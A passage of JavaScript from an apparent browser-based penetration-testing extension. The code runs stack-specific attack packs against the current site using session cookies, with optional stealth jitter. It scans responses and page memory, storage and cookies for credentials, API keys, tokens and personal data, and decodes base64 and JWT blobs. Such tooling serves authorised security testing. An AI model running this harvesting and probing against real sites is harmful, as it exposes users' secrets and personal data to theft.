  if(/rails|ruby/.test(n))return "rails";
  if(/asp\.?net|iis/.test(n))return "aspnet";
  if(/django|flask|python/.test(n))return "django";
  if(/next\.?js/.test(n))return "nextjs";
  if(/graphql/.test(n))return "graphql";
  if(/wordpress|wp/.test(n))return "wordpress";
  return null;
}

// Run stack attack packs for every detected tech in tab.techStack. One page-context
// script per pack (rather than per step) for efficiency. Aggro gating:
// - careful: only steps marked severity != "critical" run (read-only paths only)
// - medium / full: every step in matching packs runs
// All requests use credentials:'include' so session cookies pass through. Custom
// headers (from the popup textarea) are merged into every request. Stealth applies a
// shuffled order plus 40-220ms jitter between steps.
async function runStackAttacks(tabId,customHeaders,stealth,aggroLevel){
  const tab=T(tabId);
  if(!Array.isArray(tab.stackAttacks))tab.stackAttacks=[];
  const detected=new Set();
  (tab.techStack||[]).forEach(t=>{const k=mapStackKey(t&&t.name);if(k)detected.add(k);});
  // Also derive stack hints from tech detected via headers (X-Powered-By, Server, etc.)
  // and dependencyVersions — extra coverage for stacks without an explicit techStack hit.
  (tab.dependencyVersions||[]).forEach(d=>{const k=mapStackKey(d&&d.name);if(k)detected.add(k);});
  if(!detected.size)return;

  // Resolve base URL so packs target this tab's origin
  let baseUrl="";
  try{const t=await chrome.tabs.get(tabId);baseUrl=t.url?new URL(t.url).origin:"";}catch(e){}
  if(!baseUrl)baseUrl=tab.url?(()=>{try{return new URL(tab.url).origin;}catch{return "";}})():"";
  if(!baseUrl)return;

  // Build the executable list, filtered by aggro
  const items=[];
  detected.forEach(family=>{
    (STACK_ATTACK_PACKS[family]||[]).forEach(step=>{
      // Careful mode: skip steps that explicitly write or are critical-severity probes.
      if(aggroLevel==="careful"&&step.severity==="critical")return;
      if(aggroLevel==="careful"&&step.method&&step.method!=="GET"&&step.method!=="HEAD")return;
      items.push({family,...step});
    });
  });
  if(!items.length)return;

  // Symbol table for graphql field fuzzing custom step (use-symbol-table-as-field-dict)
  const symbolHints=(tab.symbolTable||[]).filter(s=>s&&s.name&&s.category!=="generic").map(s=>s.name).slice(0,40);

  // Inject the named page-runner. See __pageRunStackAttacks for the runner body and
  // why we pass everything through args rather than embedding values in the source.
  let results=[];
  try{
    const inj=await chrome.scripting.executeScript({target:{tabId},world:"MAIN",func:__pageRunStackAttacks,args:[items,customHeaders||{},!!stealth,baseUrl,symbolHints]});
    if(inj&&inj[0]&&Array.isArray(inj[0].result))results=inj[0].result;
  }catch(e){
    try{
      const inj2=await chrome.scripting.executeScript({target:{tabId},func:__pageRunStackAttacks,args:[items,customHeaders||{},!!stealth,baseUrl,symbolHints]});
      if(inj2&&inj2[0]&&Array.isArray(inj2[0].result))results=inj2[0].result;
    }catch(e2){console.warn("[PenScope] stack attacks injection",e2&&e2.message||e2);return;}
  }

  // Merge: deduplicate by family+step+url so re-runs don't duplicate findings, but DO
  // refresh the latest status/evidence (a second run might catch a freshly-deployed leak).
  results.forEach(r=>{
    if(!r||!r.step)return;
    const key=`${r.family}|${r.step}|${r.url||""}`;
    const existing=tab.stackAttacks.findIndex(a=>a&&`${a.family}|${a.step}|${a.url||""}`===key);
    const entry={family:r.family,step:r.step,type:r.step,url:r.url||"",method:r.method||"GET",status:r.status||0,severity:r.severity||"info",confirmed:!!r.confirmed,evidence:r.evidence||"",timeMs:r.timeMs||0,error:r.error||null,timestamp:Date.now()};
    if(existing>=0)tab.stackAttacks[existing]=entry;
    else tab.stackAttacks.push(entry);
  });
  // Cap so a chronically-misbehaving site doesn't bloat state
  if(tab.stackAttacks.length>200)tab.stackAttacks=tab.stackAttacks.slice(-200);
}

// -------------------------------------------------------
// v5.3: AGGRESSIVE EXTRACTION — no requests, maximum data
// -------------------------------------------------------

// Deep scan an API response body for interesting data
function deepScanBody(body,url){
  const findings=[];
  if(!body||body.length<5)return findings;
  // Expanded patterns for API responses
  const patterns=[
    {name:"User PII",re:/"(?:email|mail|user_email|emailAddress)"\s*:\s*"([^"]{5,80})"/gi,sev:"medium"},
    {name:"Phone Number",re:/"(?:phone|mobile|tel|phoneNumber|phone_number)"\s*:\s*"?(\+?[\d\s()-]{7,20})/gi,sev:"medium"},
    {name:"Auth Token",re:/"(?:token|accessToken|access_token|refreshToken|refresh_token|jwt|session_token|bearer)"\s*:\s*"([^"]{10,})"/gi,sev:"critical"},
    {name:"API Key",re:/"(?:apiKey|api_key|apikey|client_secret|secret_key|privateKey)"\s*:\s*"([^"]{8,})"/gi,sev:"critical"},
    {name:"Password",re:/"(?:password|passwd|pwd|pass)"\s*:\s*"([^"]{1,})"/gi,sev:"critical"},
    {name:"Internal ID",re:/"(?:userId|user_id|accountId|account_id|internalId|employeeId|studentId|teacherId|memberId)"\s*:\s*"?([^",}\]\s]{1,80})/gi,sev:"medium"},
    {name:"Internal URL",re:/"(?:url|endpoint|host|baseUrl|apiUrl|serviceUrl|internalUrl)"\s*:\s*"(https?:\/\/(?:10\.|172\.(?:1[6-9]|2\d|3[01])\.|192\.168\.|localhost|127\.0\.)[^"]+)"/gi,sev:"high"},
    {name:"AWS Resource",re:/arn:aws:[a-z0-9-]+:[a-z0-9-]*:\d{12}:[^\s"]{5,}/g,sev:"high"},
    {name:"Connection String",re:/(?:mongodb|postgres|mysql|redis|amqp):\/\/[^\s"']{10,}/gi,sev:"critical"},
    {name:"Private Key Fragment",re:/-----BEGIN (?:RSA |EC )?PRIVATE KEY-----/g,sev:"critical"},
    {name:"Debug Info",re:/"(?:debug|stackTrace|stack_trace|exception|error_details)"\s*:\s*"?([^"]{10,200})/gi,sev:"medium"},
    {name:"File Path",re:/"(?:path|filePath|file_path|directory)"\s*:\s*"((?:\/[\w.-]+){3,}|[A-Z]:\\\\[\w\\\\.-]+)"/gi,sev:"medium"},
    {name:"Other User Data",re:/"(?:firstName|lastName|first_name|last_name|fullName|full_name|username|displayName|address|dateOfBirth|dob|birth_date|nationality|gender)"\s*:\s*"([^"]{1,100})"/gi,sev:"low"},
    {name:"Credit Card",re:/\b(?:4\d{3}|5[1-5]\d{2}|3[47]\d{2}|6(?:011|5\d{2}))[- ]?\d{4}[- ]?\d{4}[- ]?\d{1,4}\b/g,sev:"critical"},
    {name:"UUID/GUID",re:/"[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}"/gi,sev:"info"},
    // Timing attack surface detection
    {name:"Rate Limit Config",re:/"(?:rate_limit|rateLimit|max_attempts|maxAttempts|throttle|cooldown)"\s*:\s*"?(\d+)/gi,sev:"low"},
    {name:"OTP/2FA Config",re:/"(?:otp_length|otpLength|code_expiry|codeExpiry|max_retries|verification_attempts)"\s*:\s*"?(\d+)/gi,sev:"medium"},
    {name:"Session Config",re:/"(?:session_timeout|sessionTimeout|idle_timeout|token_expiry|tokenExpiry|max_sessions)"\s*:\s*"?(\d+)/gi,sev:"low"},
    // API response pagination intelligence
    {name:"Pagination Total",re:/"(?:total|count|total_count|totalCount|total_items|totalItems|total_records|recordCount)"\s*:\s*"?(\d{2,})/gi,sev:"info"},
    {name:"Limit Config",re:/"(?:per_page|perPage|page_size|pageSize|limit|max_results|maxResults)"\s*:\s*"?(\d+)/gi,sev:"info"},
    {name:"Cursor/Offset",re:/"(?:cursor|next_cursor|nextCursor|offset|next_page|nextPage|continuation_token)"\s*:\s*"([^"]{5,})"/gi,sev:"info"},
  ];
  // v5.9: Apply severity weighting to every pattern match based on context
  const isAuthApi=/\/api\/|\/auth\/|\/account\/|\/me\b|\/users\b|\/admin/i.test(url||"");
  for(const p of patterns){
    let count=0;
    for(const m of body.matchAll(p.re)){
      if(count>=5)break;
      count++;
      const val=(m[1]||m[0]).substring(0,200);
      const ctx=body.substring(Math.max(0,m.index-30),Math.min(body.length,m.index+m[0].length+30)).substring(0,150);
      const weighted=weighSeverity(p.sev,{
        inAuthenticatedApi:isAuthApi,
        inComment:/\/\/|\/\*|#\s/.test(ctx.substring(0,15)),
        valueLooksLikeTest:looksLikeTestValue(val),
        valueIsLiveJwt:p.name==="Auth Token"&&/^eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\./.test(val)
      });
      findings.push({pattern:p.name,severity:weighted,value:val,context:ctx});
    }
  }
  return findings;
}

// JS/CSS Coverage Analysis — find dead code = hidden features.
// v5.6: Profiler stays running for tab lifetime so SPA route changes keep accumulating coverage.
// Snapshots merge old unused-function lists with new ones — once a function fires, it stops
// appearing as dead code.
function takeCoverageSnapshot(tabId){
  if(!_debugTabs.has(tabId))return;
  const tab=T(tabId);
  if(!tab._coverageStarted)return;
  chrome.debugger.sendCommand({tabId},"Profiler.takePreciseCoverage",{},(result)=>{
    if(chrome.runtime.lastError||!result)return;
    const scripts=(result.result||[]).filter(s=>s.url&&s.url.startsWith("http")&&!s.url.includes("extension"));
    const coverage=[];
    scripts.forEach(script=>{
      const totalBytes=script.functions.reduce((sum,f)=>sum+f.ranges.reduce((s,r)=>s+(r.endOffset-r.startOffset),0),0);
      const usedBytes=script.functions.reduce((sum,f)=>sum+f.ranges.filter(r=>r.count>0).reduce((s,r)=>s+(r.endOffset-r.startOffset),0),0);
      const pct=totalBytes>0?Math.round(usedBytes/totalBytes*100):0;
      const unusedFunctions=script.functions.filter(f=>f.ranges.every(r=>r.count===0)&&f.functionName).map(f=>f.functionName).slice(0,50);
      if(totalBytes>1000)coverage.push({url:script.url.substring(0,150),totalBytes,usedBytes,unusedBytes:totalBytes-usedBytes,usedPercent:pct,unusedFunctions});
    });
    coverage.sort((a,b)=>b.unusedBytes-a.unusedBytes);
    tab.coverageData={scripts:coverage.slice(0,50),totalScripts:scripts.length,totalBytes:coverage.reduce((s,c)=>s+c.totalBytes,0),totalUsed:coverage.reduce((s,c)=>s+c.usedBytes,0),snapshotAt:Date.now()};
  });
}
function runCoverageAnalysis(tabId){
  if(!_debugTabs.has(tabId))return;
  const tab=T(tabId);
  if(!tab._coverageStarted){
    tab._coverageStarted=true;
    chrome.debugger.sendCommand({tabId},"Profiler.enable",{},()=>{
      if(!chrome.runtime.lastError)chrome.debugger.sendCommand({tabId},"Profiler.startPreciseCoverage",{callCount:true,detailed:false},()=>{
        setTimeout(()=>runCoverageAnalysis(tabId),10000);
      });
    });
    return;
  }
  takeCoverageSnapshot(tabId);
}

// Event Listener Enumeration — find all handlers on DOM nodes
function dumpEventListeners(tabId){
  if(!_debugTabs.has(tabId))return;
  const tab=T(tabId);
  if(tab.domListeners.length>0)return;
  // Use Runtime.evaluate to find elements with listeners, then DOMDebugger.getEventListeners
  chrome.debugger.sendCommand({tabId},"Runtime.evaluate",{
    expression:`(function(){
      var els=document.querySelectorAll("*");
      var interesting=[];
      for(var i=0;i<els.length&&i<500;i++){
        var el=els[i];
        var tag=el.tagName.toLowerCase();
        var id=el.id?"#"+el.id:"";
        var cls=el.className&&typeof el.className==="string"?"."+el.className.split(" ")[0]:"";
        var ident=tag+id+cls;
        // Check for on* attributes
        var attrs=[];
        for(var j=0;j<el.attributes.length;j++){
          var a=el.attributes[j];
          if(a.name.startsWith("on"))attrs.push({event:a.name,handler:a.value.substring(0,200)});
        }
        // Check for data-action, data-event, ng-click, @click, v-on
        ["data-action","data-event","ng-click","v-on:click","@click","data-bind"].forEach(function(attr){
          if(el.hasAttribute(attr))attrs.push({event:attr,handler:el.getAttribute(attr).substring(0,200)});
        });
        if(attrs.length)interesting.push({element:ident,attrs:attrs});
      }
      // Also find elements with href="javascript:"
      document.querySelectorAll('[href^="javascript:"]').forEach(function(el){
        interesting.push({element:el.tagName.toLowerCase()+(el.id?"#"+el.id:""),attrs:[{event:"href-js",handler:el.getAttribute("href").substring(0,200)}]});
      });
      return JSON.stringify(interesting);
    })()`,
    returnByValue:true
  },(result)=>{
    if(chrome.runtime.lastError||!result?.result?.value)return;
    try{
      const listeners=JSON.parse(result.result.value);
      tab.domListeners=listeners.slice(0,200);
    }catch(e){console.warn('[PenScope] dumpEventListeners',e.message||e);}
  });
}

// Shadow DOM Piercing — read content from shadow roots
function pierceShadowDOM(tabId){
  if(!_debugTabs.has(tabId))return;
  const tab=T(tabId);
  if(tab.shadowDOMData.length>0)return;
  chrome.debugger.sendCommand({tabId},"Runtime.evaluate",{
    expression:`(function(){
      var results=[];
      function walkShadow(root,path){
        if(!root)return;
        var hosts=root.querySelectorAll("*");
        for(var i=0;i<hosts.length&&results.length<50;i++){
          var sr=hosts[i].shadowRoot;
          if(!sr)continue;
          var tag=hosts[i].tagName.toLowerCase();
          var id=hosts[i].id?"#"+hosts[i].id:"";
          var childPath=path+">"+tag+id;
          // Extract shadow content
          var text=sr.textContent?sr.textContent.substring(0,500):"";
          var inputs=[];
          sr.querySelectorAll("input,select,textarea").forEach(function(inp){
            inputs.push({type:inp.type||"text",name:inp.name||"",value:inp.value?inp.value.substring(0,100):"",id:inp.id||""});
          });
          var links=[];
          sr.querySelectorAll("a[href]").forEach(function(a){links.push(a.href);});
          var forms=[];
          sr.querySelectorAll("form").forEach(function(f){forms.push({action:f.action||"",method:f.method||"GET"});});
          results.push({host:childPath,inputCount:inputs.length,linkCount:links.length,formCount:forms.length,inputs:inputs.slice(0,20),links:links.slice(0,20),forms:forms.slice(0,10),textPreview:text.substring(0,200)});
          // Recurse into nested shadows
          walkShadow(sr,childPath);
        }
      }
      walkShadow(document,"document");
      return JSON.stringify(results);
    })()`,
    returnByValue:true
  },(result)=>{
    if(chrome.runtime.lastError||!result?.result?.value)return;
    try{tab.shadowDOMData=JSON.parse(result.result.value);}catch(e){console.warn('[PenScope] pierceShadowDOM',e.message||e);}
  });
}

// Memory String Mining — search V8 runtime for leaked secrets.
// v5.6 rewrite: substring scanning instead of anchored regex, deeper traversal, JSON.stringify of
// nested objects. The old version only matched standalone strings like val==="AKIA..." and missed
// everything embedded in headers/JSON values/cookie blobs, which is where real secrets actually live.
function mineMemoryStrings(tabId){
  if(!_debugTabs.has(tabId))return;
  const tab=T(tabId);
  if(tab._memoryMined)return;
  tab._memoryMined=true;
  chrome.debugger.sendCommand({tabId},"Runtime.evaluate",{
    expression:`(function(){
      var found=[];
      var seenFp={};
      // Substring patterns — each one scans for occurrences of the prefix, then expands to a match.
      // All prefixes are unique enough to avoid scanning large strings redundantly.
      var PREFIXES=[
        {t:"JWT",p:"eyJ",re:/eyJ[A-Za-z0-9_-]{10,}\\.eyJ[A-Za-z0-9_-]{10,}(?:\\.[A-Za-z0-9_-]+)?/g,sev:"high"},
        {t:"AWS Access Key",p:"AKIA",re:/AKIA[0-9A-Z]{16}/g,sev:"critical"},
        {t:"AWS Temp Key",p:"ASIA",re:/ASIA[0-9A-Z]{16}/g,sev:"critical"},
        {t:"Stripe Key",p:"sk_live_",re:/sk_live_[A-Za-z0-9]{20,}/g,sev:"critical"},
        {t:"Stripe Key",p:"sk_test_",re:/sk_test_[A-Za-z0-9]{20,}/g,sev:"critical"},
        {t:"Stripe Key",p:"pk_live_",re:/pk_live_[A-Za-z0-9]{20,}/g,sev:"high"},
        {t:"Stripe Restricted",p:"rk_live_",re:/rk_live_[A-Za-z0-9]{20,}/g,sev:"critical"},
        {t:"GitHub Token",p:"ghp_",re:/ghp_[A-Za-z0-9]{36,}/g,sev:"critical"},
        {t:"GitHub Server Token",p:"ghs_",re:/ghs_[A-Za-z0-9]{36,}/g,sev:"critical"},
        {t:"GitHub User Token",p:"gho_",re:/gho_[A-Za-z0-9]{36,}/g,sev:"critical"},
        {t:"GitHub PAT",p:"github_pat_",re:/github_pat_[A-Za-z0-9_]{22,}/g,sev:"critical"},
        {t:"GitLab PAT",p:"glpat-",re:/glpat-[A-Za-z0-9_-]{20,}/g,sev:"critical"},
        {t:"Slack Bot Token",p:"xoxb-",re:/xoxb-[0-9A-Za-z-]{10,}/g,sev:"critical"},
        {t:"Slack User Token",p:"xoxp-",re:/xoxp-[0-9A-Za-z-]{10,}/g,sev:"critical"},
        {t:"SendGrid",p:"SG.",re:/SG\\.[A-Za-z0-9_-]{22}\\.[A-Za-z0-9_-]{43}/g,sev:"critical"},
        {t:"OpenAI Key",p:"sk-",re:/sk-[A-Za-z0-9]{20,}T3BlbkFJ[A-Za-z0-9]{20,}/g,sev:"critical"},
        {t:"Anthropic Key",p:"sk-ant-",re:/sk-ant-api03-[A-Za-z0-9_-]{90,}/g,sev:"critical"},
        {t:"HuggingFace",p:"hf_",re:/hf_[A-Za-z0-9]{30,}/g,sev:"high"},
        {t:"Google API Key",p:"AIza",re:/AIza[A-Za-z0-9_-]{35}/g,sev:"high"},
        {t:"Google OAuth ID",p:".apps.googleusercontent.com",re:/[0-9]+-[0-9A-Za-z_]{32}\\.apps\\.googleusercontent\\.com/g,sev:"medium"},
        {t:"Google OAuth Secret",p:"GOCSPX-",re:/GOCSPX-[A-Za-z0-9_-]{28}/g,sev:"critical"},
        {t:"Vault Token",p:"hvs.",re:/hvs\\.[A-Za-z0-9_-]{24,}/g,sev:"critical"},
        {t:"npm Token",p:"npm_",re:/npm_[A-Za-z0-9]{36}/g,sev:"critical"},
        {t:"Twilio SID",p:"AC",re:/AC[a-f0-9]{32}/g,sev:"high"},
        {t:"Shopify",p:"shpat_",re:/shpat_[a-fA-F0-9]{32}/g,sev:"critical"},
        {t:"DigitalOcean",p:"dop_v1_",re:/dop_v1_[a-f0-9]{64}/g,sev:"critical"},
        {t:"MongoDB URI",p:"mongodb",re:/mongodb(?:\\+srv)?:\\/\\/[^\\s"'<>]{10,200}/g,sev:"critical"},
        {t:"Postgres URI",p:"postgres",re:/postgres(?:ql)?:\\/\\/[^\\s"'<>]{10,200}/g,sev:"critical"},
        {t:"MySQL URI",p:"mysql:",re:/mysql:\\/\\/[^\\s"'<>]{10,200}/g,sev:"critical"},
        {t:"Redis URI",p:"redis:",re:/redis(?:s)?:\\/\\/[^\\s"'<>]{10,200}/g,sev:"high"},
        {t:"Private Key",p:"-----BEGIN",re:/-----BEGIN [A-Z ]*PRIVATE KEY(?:\\sBLOCK)?-----/g,sev:"critical"},
        {t:"Bearer Token",p:"Bearer ",re:/Bearer [A-Za-z0-9._\\-+/=]{20,500}/g,sev:"high"},
        {t:"Basic Auth",p:"Basic ",re:/Basic [A-Za-z0-9+/=]{15,200}/g,sev:"high"},
        {t:"Internal URL",p:"://10.",re:/https?:\\/\\/10\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}(?::\\d+)?(?:\\/[^\\s"'<>]*)?/g,sev:"medium"},
        {t:"Internal URL",p:"://192.168.",re:/https?:\\/\\/192\\.168\\.\\d{1,3}\\.\\d{1,3}(?::\\d+)?(?:\\/[^\\s"'<>]*)?/g,sev:"medium"},
        {t:"Internal URL",p:"://172.",re:/https?:\\/\\/172\\.(?:1[6-9]|2\\d|3[01])\\.\\d{1,3}\\.\\d{1,3}(?::\\d+)?(?:\\/[^\\s"'<>]*)?/g,sev:"medium"},
        {t:"Internal URL",p:"://localhost",re:/https?:\\/\\/localhost(?::\\d+)?(?:\\/[^\\s"'<>]*)?/g,sev:"medium"},
        {t:"AWS ARN",p:"arn:aws:",re:/arn:aws:[a-z0-9-]+:[a-z0-9-]*:\\d{12}:[a-zA-Z0-9/_-]+/g,sev:"medium"},
        {t:"Sentry DSN",p:".ingest.sentry.io",re:/https:\\/\\/[a-f0-9]{32}@[a-z0-9.]+\\.ingest\\.sentry\\.io\\/\\d+/g,sev:"medium"},
        {t:"Slack Webhook",p:"hooks.slack.com",re:/https:\\/\\/hooks\\.slack\\.com\\/services\\/[A-Za-z0-9/]+/g,sev:"high"},
        {t:"Discord Webhook",p:"discord.com/api/webhooks",re:/https:\\/\\/(?:discord|discordapp)\\.com\\/api\\/webhooks\\/\\d+\\/[A-Za-z0-9_-]+/g,sev:"high"}
      ];
      function scan(str,source){
        if(!str||typeof str!=="string"||str.length<8)return;
        if(str.length>500000)str=str.substring(0,500000);
        for(var i=0;i<PREFIXES.length;i++){
          var pat=PREFIXES[i];
          if(str.indexOf(pat.p)===-1)continue;
          pat.re.lastIndex=0;
          var m,cnt=0;
          while((m=pat.re.exec(str))!==null&&cnt<5){
            cnt++;
            var val=m[0];
            var fp=pat.t+":"+val.substring(0,40);
            if(seenFp[fp])continue;
            seenFp[fp]=1;
            found.push({type:pat.t,value:val.length>200?val.substring(0,200)+"...":val,source:source,severity:pat.sev,length:val.length});
          }
        }
      }
      function walk(obj,path,depth){
        if(obj==null||depth>6||found.length>300)return;
        var t=typeof obj;
        if(t==="string"){scan(obj,path);return;}
        if(t==="number"||t==="boolean")return;
        if(t==="function"){try{scan(obj.toString().substring(0,5000),path+"()");}catch(e){}return;}
        if(t!=="object")return;
        // Try JSON.stringify for a single-pass scan of the entire subtree
        try{
          var s=JSON.stringify(obj);
          if(s&&s.length<200000){scan(s,path);return;}
        }catch(e){}
        // Fallback: walk manually if stringify fails (circular) or the object is huge
        try{
          var keys=Array.isArray(obj)?obj.slice(0,20).map(function(_,i){return i;}):Object.keys(obj).slice(0,60);
          for(var i=0;i<keys.length&&found.length<300;i++){
            try{walk(obj[keys[i]],path+"."+keys[i],depth+1);}catch(e){}
          }
        }catch(e){}
      }
      var skip={chrome:1,document:1,window:1,self:1,top:1,parent:1,frames:1,location:1,navigator:1,performance:1,screen:1,history:1,console:1,localStorage:1,sessionStorage:1,fetch:1,XMLHttpRequest:1,Array:1,Object:1,String:1,Number:1,Boolean:1,Function:1,RegExp:1,Date:1,Math:1,JSON:1,Promise:1,Map:1,Set:1,WeakMap:1,WeakSet:1,Symbol:1,Proxy:1,Reflect:1,Error:1,Buffer:1};
      // Walk all window properties to 6 levels deep (via JSON.stringify)
      try{
        var winKeys=Object.getOwnPropertyNames(window).slice(0,500);
        for(var wi=0;wi<winKeys.length;wi++){
          var k=winKeys[wi];
          if(skip[k]||k.charAt(0)==="_"&&k.charAt(1)!=="_")continue;
          try{
            var v=window[k];
            if(v==null)continue;
            walk(v,"window."+k,0);
          }catch(e){}
          if(found.length>=300)break;
        }
      }catch(e){}
      // localStorage — scan values AND try JSON-parsed sub-values
      try{for(var i=0;i<localStorage.length;i++){
        var lk=localStorage.key(i);var lv=localStorage.getItem(lk);
        if(!lv)continue;
        scan(lv,"localStorage."+lk);
        if(lv.charAt(0)==="{"||lv.charAt(0)==="["){try{walk(JSON.parse(lv),"localStorage."+lk,0);}catch(e){}}
      }}catch(e){}
      try{for(var i=0;i<sessionStorage.length;i++){
        var sk=sessionStorage.key(i);var sv=sessionStorage.getItem(sk);
        if(!sv)continue;
        scan(sv,"sessionStorage."+sk);
        if(sv.charAt(0)==="{"||sv.charAt(0)==="["){try{walk(JSON.parse(sv),"sessionStorage."+sk,0);}catch(e){}}
      }}catch(e){}
      // Cookies — scan values and decoded JSON cookies
      try{
        document.cookie.split(";").forEach(function(c){
          var parts=c.trim().split("=");if(parts.length<2)return;
          var name=parts[0];var val=parts.slice(1).join("=");
          scan(val,"cookie."+name);
          try{var decoded=decodeURIComponent(val);if(decoded!==val)scan(decoded,"cookie."+name+"(decoded)");}catch(e){}
        });
      }catch(e){}
      // Meta tags
      try{document.querySelectorAll("meta[content]").forEach(function(m){if(m.content)scan(m.content,"meta."+(m.name||m.getAttribute("property")||"?"));});}catch(e){}
      // Hidden inputs and data-* attributes
      try{document.querySelectorAll("input[type=hidden][value],[data-token],[data-auth],[data-config],[data-payload]").forEach(function(el){
        if(el.value)scan(el.value,"input."+(el.name||el.id||"?"));
        for(var ai=0;ai<el.attributes.length;ai++){
          var a=el.attributes[ai];
          if(a.name.indexOf("data-")===0&&a.value)scan(a.value,"dom."+a.name);
        }
      });}catch(e){}
      // Inline scripts — often contain config blobs with tokens
      try{
        var inlineTotal="";
        document.querySelectorAll("script:not([src])").forEach(function(s){
          var t=s.textContent||"";if(t.length<10||t.length>200000)return;
          inlineTotal+=t+"\\n";
        });
        if(inlineTotal.length>20&&inlineTotal.length<500000)scan(inlineTotal,"inline-scripts");
      }catch(e){}
      return JSON.stringify(found.slice(0,200));
    })()`,
    returnByValue:true,
    timeout:15000
  },(result)=>{
    if(chrome.runtime.lastError||!result?.result?.value)return;
    try{
      const found=JSON.parse(result.result.value);
      tab.memoryStrings=found;
      // Promote into main secrets list with proper severity
      found.forEach(f=>{
        const fp="mem:"+f.type+":"+String(f.value).substring(0,30);
        if(!seen(tabId,"secmem",fp)){
          tab.secrets.push({type:f.type+" (memory)",value:String(f.value),severity:f.severity||"high",source:"memory:"+f.source,context:"V8 heap/runtime"});
        }
      });
    }catch(e){console.warn('[PenScope] mineMemoryStrings',e.message||e);}
  });
}

// Encoded/Encrypted Blob Detection — flag everything, let pentester decode
function detectEncodedBlobs(tabId){
  if(!_debugTabs.has(tabId))return;
  const tab=T(tabId);
  if(tab.encodedBlobs.length>0)return;
  chrome.debugger.sendCommand({tabId},"Runtime.evaluate",{
    expression:`(function(){
      var blobs=[];
      var seen={};
      function add(type,value,source,meta){
        var key=type+":"+value.substring(0,40);
        if(seen[key])return;seen[key]=1;
        blobs.push({type:type,value:value.substring(0,2000),source:source,meta:meta||null,length:value.length});
      }
      function scan(str,source){
        if(!str||typeof str!=="string"||str.length<8)return;
        // Base64 — at least 20 chars, valid alphabet, not a URL/path/word
        var b64=str.match(/(?:[A-Za-z0-9+\\/]{4}){5,}(?:[A-Za-z0-9+\\/]{2}==|[A-Za-z0-9+\\/]{3}=)?/g);
        if(b64)b64.forEach(function(m){
          if(m.length<20)return;
          if(/^[a-z]+$/i.test(m))return;
          if(/^[A-Z_]+$/.test(m))return;
          if(m.indexOf("/")===0)return;
          // Check if it's a JWT (handled separately)
          if(/^eyJ/.test(m))return;
          // Skip cache busters, version hashes, SAS signatures
          if(/^[A-Za-z0-9_-]{20,50}$/.test(m)&&m.indexOf("+")===-1&&m.indexOf("/")===-1&&m.indexOf("=")===-1)return;
          // Try decode to check if it's real base64
          try{
            var decoded=atob(m);
            var printable=0;
            for(var i=0;i<Math.min(decoded.length,100);i++){
              var c=decoded.charCodeAt(i);
              if((c>=32&&c<=126)||c===10||c===13||c===9)printable++;
            }
            var ratio=printable/Math.min(decoded.length,100);
            if(ratio>0.7){
              // Readable text inside
              var preview=decoded.substring(0,200).replace(/[\\x00-\\x08\\x0b\\x0c\\x0e-\\x1f]/g,".");
              var subtype="base64-text";
              if(decoded.startsWith("{")||decoded.startsWith("["))subtype="base64-json";
              if(/https?:/.test(decoded))subtype="base64-url";
              if(/password|secret|token|key|auth/i.test(decoded))subtype="base64-sensitive";
              add(subtype,m,source,{preview:preview,decodedLength:decoded.length});
            }else if(decoded.length>16){
              // Binary data — could be encrypted
              var hex="";for(var i=0;i<Math.min(16,decoded.length);i++)hex+=("0"+decoded.charCodeAt(i).toString(16)).slice(-2)+" ";
              // Check for known encryption headers
              var itype="base64-binary";
              if(decoded.substring(0,8)==="Salted__")itype="openssl-encrypted";
              if(decoded.charCodeAt(0)===0x30&&decoded.charCodeAt(1)===0x82)itype="asn1-der";
              if(hex.trim().startsWith("00 00 00"))itype="possible-encrypted";
              add(itype,m,source,{hexPreview:hex.trim(),decodedLength:decoded.length});
            }
          }catch(e){}
        });
        // JWT tokens
        var jwts=str.match(/eyJ[A-Za-z0-9_-]{10,}\\.eyJ[A-Za-z0-9_-]{10,}(?:\\.[A-Za-z0-9_-]+)?/g);
        if(jwts)jwts.forEach(function(m){
          try{
            var parts=m.split(".");
            var header=JSON.parse(atob(parts[0].replace(/-/g,"+").replace(/_/g,"/")));
            var payload=JSON.parse(atob(parts[1].replace(/-/g,"+").replace(/_/g,"/")));
            add("jwt",m,source,{header:header,payload:payload,algorithm:header.alg||"?",claims:Object.keys(payload)});
          }catch(e){add("jwt-malformed",m,source,null);}
        });
        // URL-encoded blobs (double/triple encoded)
        var urlenc=str.match(/%[0-9A-Fa-f]{2}(?:%[0-9A-Fa-f]{2}){5,}/g);
        if(urlenc)urlenc.forEach(function(m){
          if(m.length<18)return;
          try{
            var decoded=decodeURIComponent(m);
            if(decoded!==m){
              var subtype="url-encoded";
              if(/%[0-9A-Fa-f]{2}/.test(decoded))subtype="double-url-encoded";
              if(decoded.startsWith("eyJ"))subtype="url-encoded-jwt";
              if(/^[A-Za-z0-9+\\/=]{20,}$/.test(decoded))subtype="url-encoded-base64";
              add(subtype,m,source,{decoded:decoded.substring(0,200)});
            }
          }catch(e){}
        });
        // Hex-encoded strings (continuous hex, 32+ chars)
        var hexstrs=str.match(/(?:0x)?[0-9a-fA-F]{32,}/g);
        if(hexstrs)hexstrs.forEach(function(m){
          if(m.length<32)return;
          var clean=m.replace(/^0x/,"");
          // Skip UUID-length hex (32 chars = UUID without hyphens) unless it's clearly not a UUID
          if(clean.length===32&&/^[0-9a-f]{32}$/i.test(clean)){
            // Could be MD5 or UUID — flag as hash
          }else if(clean.length<40)return; // Too short, likely a cache buster
          // Check if it's a hash (common lengths)
          var htype="hex-encoded";
          var clean=m.replace(/^0x/,"");
          if(clean.length===32)htype="hex-md5";
          if(clean.length===40)htype="hex-sha1";
          if(clean.length===64)htype="hex-sha256";
          if(clean.length===128)htype="hex-sha512";
          // Try decode hex to ascii
          try{
            var ascii="";
            for(var i=0;i<Math.min(clean.length,64);i+=2)ascii+=String.fromCharCode(parseInt(clean.substr(i,2),16));
            var printable=0;
            for(var j=0;j<ascii.length;j++){var c=ascii.charCodeAt(j);if(c>=32&&c<=126)printable++;}
            if(printable/ascii.length>0.7)htype="hex-text";
          }catch(e){}
          add(htype,m,source,{length:clean.length/2});
        });
        // AES/encryption indicators
        if(/U2FsdGVkX1/.test(str)){
          var aes=str.match(/U2FsdGVkX1[A-Za-z0-9+\\/=]{16,}/g);
          if(aes)aes.forEach(function(m){add("aes-cryptojs",m,source,{note:"CryptoJS AES encrypted (Salted__ header)"});});
        }
        if(/\\$2[aby]?\\$\\d{2}\\$/.test(str)){
